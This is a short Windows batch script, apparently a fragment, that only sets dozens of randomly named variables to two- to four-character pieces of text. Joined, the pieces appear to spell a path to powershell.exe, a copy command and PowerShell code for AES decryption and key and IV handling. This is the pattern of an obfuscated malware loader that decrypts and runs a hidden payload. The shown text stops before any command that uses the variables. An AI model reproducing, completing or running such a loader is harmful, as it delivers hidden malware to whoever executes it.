@echo off
set "ynCFSBaJhw=:\"
set "bArodSufsf=we"
set "BNLDJWtDRB=he"
set "rOIPYEyesG=rS"
set "UUhjbcLXpq=nd"
set "wfFdZtHhSP=ll"
set "mDEhFscvaR=.e"
set "YvrZklxbyi=s\"
set "DTaazhgYrT=in"
set "bWuNkfEmTa=do"
set "PPTClVbBQR=\W"
set "FKygXizJie=32"
set "QdtQjsIDax=st"
set "XqlCiAItEL=po"
set "TDKRadvimo= C"
set "pZBkmXjEXq=y "
set "NLgpvaFnBy=he"
set "ngETJliFQF=0\"
set "nCYBJUjxsb=ow"
set "UHfJsSJqfX=Wi"
set "RzqfkUrCkp=xe"
set "wvNzbZhhwr= /"
set "yargmLJyHQ=Po"
set "TYvVIStvSc=ws"
set "IcfUlQZFaI=we"
set "ImYdYzCiYP=em"
set "HaxhukbJHS=ll"
set "GwOquJKlQh=co"
set "yncMKJsCiH=\v"
set "tfcptEftDP=Sy"
set "ZEoQCrJjdy=rs"
set "hMckCZezwf=py"
set "nFgacqtcSc=1."
set "TEYXZbpnrw=cd"
set "LckKpPqyeH= %~dp0"
set "JkJCoHQeMZ=.Mem"
set "mNBlJOjckZ=-joi"
set "CoSjutwRLz=.Mod"
set "TWyTpHpjez=K = "
set "kjAaIDwXZn=CK ="
set "HARcCQIgem=l) {"
set "RnFHMWugLX=Mode"
set "POWGnNpLuX=$gYf"
set "ewyRIsgcEQ=m(, "
set "CpFyZSlwck=hy.A"
set "AnnTYmnotD=fore"
set "OcPzTBGiaJ=gYfU"
set "NPgYnUxKiZ=('KY"
set "peaeGxwFKc=g = "
set "MQGmzgMZlG=1] -"
set "neoNHruCaS=.Cop"
set "pqkpADLSTB=]::("
set "bpHGytdDEg=).Sp"
set "btQlSxUehL=pher"
set "bHVnaroyuk=ose("
set "jqVyRUtwvC=urit"
